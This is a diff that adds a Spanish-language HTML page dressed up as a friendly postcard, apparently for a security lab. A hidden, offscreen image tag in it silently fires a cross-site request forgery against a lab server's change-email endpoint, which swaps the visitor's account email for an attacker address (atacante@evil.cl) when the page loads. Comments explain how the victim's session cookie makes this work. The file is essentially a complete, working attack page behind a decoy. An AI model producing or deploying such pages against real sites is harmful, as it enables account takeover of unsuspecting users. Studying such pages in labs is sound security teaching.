@@ -1,0 +1,27 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Tu postal</title>
+<style>
+  body { font-family: system-ui, sans-serif; background:#fff4d6; color:#5a3b00; text-align:center;
+         padding:3rem 1rem; }
+  .postal { font-size:5rem; }
+</style>
+</head>
+<body>
+  <h1>Aqui esta tu postal &#128247;</h1>
+  <div class="postal">&#127958;&#65039;&#10052;&#65039;&#128039;</div>
+  <p>&iexcl;Gracias por visitarnos!</p>
+
+  <!--
+    VARIANTE GET: con solo cargar esta pagina, el navegador pide esta "imagen".
+    En realidad es una peticion GET al endpoint vulnerable, con la cookie de
+    sesion de la victima adjuntada automaticamente -> cambia el correo de la cuenta.
+    Cambia la IP si tu VM victima usa otra.
+  -->
+  <img src="https://192.168.56.10:8001/account/change-email?new=atacante@evil.cl"
+       width="1" height="1" style="position:absolute;left:-9999px" alt="">
+</body>
+</html>
